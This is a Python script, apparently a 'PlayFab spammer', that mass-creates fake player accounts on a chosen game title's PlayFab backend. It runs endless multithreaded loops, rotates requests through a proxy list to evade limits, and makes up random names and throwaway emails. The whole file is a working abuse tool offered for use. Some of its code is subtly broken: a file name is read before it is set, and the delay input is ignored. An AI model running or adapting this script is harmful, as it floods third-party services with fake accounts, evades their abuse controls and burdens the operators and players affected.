import requests, math, random, string, time
import threading
from threading import Thread
from colorama import Fore, Style
# Converted by clown because I didnt tell deezey lol
successfulAccounts = 0
unsuccessfulAccounts = 0
lock = threading.Lock()
stopPrinting = False

class PlayFabUserRegistration:
    def __init__(self):
        self.baseurl = f"https://{PFID}.playfabapi.com/Client/RegisterPlayFabUser"
        self.headers = {"Content-Type": "application/json"}
        self.proxies = self.loadproxies()
        self.running = True
        self.filename = proxFile
        self.successfulAccounts = successfulAccounts
        self.unsuccessfulAccounts = unsuccessfulAccounts

    def loadproxies(self):
        with open(self.filename, "r") as f:
            return [line.strip() for line in f.readlines()]

    def generaterandomstring(self, length):
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))
    
    def sendregistrationrequest(self, proxy):
        while self.running:
            randomsuffix = self.generaterandomstring(5)
            data = {
                "TitleId": PFID,
                "Email": f"{DisplayName}{randomsuffix}@spammed.com",
                "Password": Password,
                "Username": f"{DisplayName}{randomsuffix}",
                "DisplayName": f"{DisplayName}{self.generaterandomstring(5)}"
            }
            try:
                response = requests.post(self.baseurl, json=data, headers=self.headers, proxies={"http": proxy, "https": proxy})
                if response.status_code == 200:
                    with lock:
                        self.successfulAccounts += 1
                else:
                    with lock:
                        self.unsuccessfulAccounts += 1
            except Exception as e:
                pass

    def startrequests(self, numthreads):
        threads = []
        for proxy in self.proxies:
            thread = threading.Thread(target=self.sendregistrationrequest, args=(proxy,))
            threads.append(thread)
            thread.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            for thread in threads:
                thread.join()

class PlayFabUserCreation:
    def __init__(self):
        self.baseurl = f"https://{PFID}.playfabapi.com/Client/LoginWithCustomID"
        self.headers = {"Content-Type": "application/json"}
        self.proxies = self.loadproxies()
        self.running = True
        self.successfulAccounts = successfulAccounts
        self.unsuccessfulAccounts = unsuccessfulAccounts

    def loadproxies(self):
        with open(proxFile, "r") as f:
            return [line.strip() for line in f.readlines()]
    
    def generaterandomstring(self, length):
        characters = string.ascii_letters + string.digits
        return ''.join(random.choice(characters) for _ in range(length))
    
    def sendcreationrequest(self, proxy):
        while self.running:
            data = {
                "TitleId": PFID,
                "CustomId": self.generaterandomstring(10),
                "CreateAccount": True,
                "DisplayName": f"{DisplayName}{self.generaterandomstring(5)}"
            }
            try:
                response = requests.post(self.baseurl, json=data, headers=self.headers, proxies={"http": proxy, "https": proxy})
                if response.status_code == 200:
                    with lock:
                        self.successfulAccounts += 1
                else:
                    with lock:
                        self.unsuccessfulAccounts += 1
            except Exception as e:
                pass
    
    def startrequests(self, numthreads):
        threads = []
        for proxy in self.proxies:
            thread = threading.Thread(target=self.sendcreationrequest, args=(proxy,))
            threads.append(thread)
            thread.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            for thread in threads:
                thread.join()

def printaccountcounts(creationobj):
    global stopPrinting

    while True:
        time.sleep(1)
        with lock:
            if stopPrinting:
                break
            print("\rAccounts Successfully Made: {} | Accounts Unsuccessfully Made: {}".format(creationobj.successfulAccounts, creationobj.unsuccessfulAccounts), end='', flush=True)

def runthreaded(threadcount, accountspthread, creationobj):
    global numAccounts

    numAccounts = threadCount * accountspthread

    printThread = Thread(target=printaccountcounts, args=(creationobj,))
    printThread.start()

    threads = []
    for i in range(threadCount):
        proxy = creationobj.proxies[i % len(creationobj.proxies)]
        thread = Thread(target=creationobj.sendcreationrequest, args=(proxy,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    printThread.join()

def countlinesinfile(filepath):
    return len(open(filepath,"r").read().splitlines())

def run(id, prox_file, useReg : bool):
    global DisplayName, Password, accCrDelay, threadCount, PFID, proxFile
    proxFile = prox_file
    PFID = id
    proxycount = countlinesinfile(proxFile)

    print(Fore.YELLOW + "\nDeezeys PlayFab Spammer With Proxys")
    DisplayName = input("Name of accounts: ")
    if useReg:
        Password = input("Password: ")
    threadCount = int(input(f"Thread count (recommended: {math.ceil(proxycount/2)}): "))
    accCrDelay = float(input("Delay In Seconds (recommened: 0.1): "))
    
    if useReg:
        SpamClass = PlayFabUserRegistration()
    else:
        SpamClass = PlayFabUserCreation()

    print("Spamming accounts...")
    runthreaded(threadCount, 1, SpamClass)
    
    print("\nFinal Counts:")
    print("Accounts Successfully Made:", SpamClass.successfulAccounts)
    print("Accounts Unsuccessfully Made:", SpamClass.unsuccessfulAccounts)